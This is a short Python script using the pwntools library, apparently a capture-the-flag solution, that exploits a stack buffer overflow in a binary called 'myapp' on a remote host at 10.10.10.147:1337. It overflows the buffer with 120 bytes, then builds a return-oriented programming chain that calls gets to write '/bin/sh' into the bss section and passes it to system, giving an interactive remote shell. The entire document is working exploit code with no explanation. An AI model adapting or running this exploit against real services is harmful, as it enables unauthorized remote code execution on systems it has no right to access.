from pwn import *

#p = process("./myapp")
p = remote(host='10.10.10.147',port='1337') 
bss = p64(0x00404048)
system = p64(0x00401040)
gets = p64(0x00401060)
pop_rdi = p64(0x000000000040120b)

buf  = "A"*120
buf += pop_rdi
buf += bss
buf += gets
buf += pop_rdi
buf += bss
buf += system

p.sendline(buf)
p.sendline('/bin/sh')

p.interactive()
